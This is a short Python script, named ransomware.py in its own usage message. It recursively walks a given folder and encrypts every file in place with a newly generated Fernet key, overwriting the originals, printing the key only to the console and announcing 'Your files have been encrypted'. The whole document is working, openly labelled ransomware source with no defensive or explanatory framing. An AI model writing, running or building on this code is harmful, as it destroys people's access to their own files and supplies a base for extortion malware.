import sys
import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
	with open(file_path, 'rb') as f:
		data = f.read()
	fernet = Fernet(key)
	encrypted_data = fernet.encrypt(data)
	with open(file_path, 'wb') as f:
		f.write(encrypted_data)
	print(f"File encrypted: {file_path}")

def main():
	if len(sys.argv) != 2:
		print("Usage: python ransomware.py <folder_path>")
		sys.exit(1)

	folder_path = sys.argv[1]
	key = Fernet.generate_key()

	print("Encryption Key:",  key.decode())

	for root, dirs, files in os.walk(folder_path):
		for file in files:
			file_path = os.path.join(root, file)
			encrypt_file(file_path, key)

	print("Your files have been encrypted")

if __name__ == "__main__":
	main()
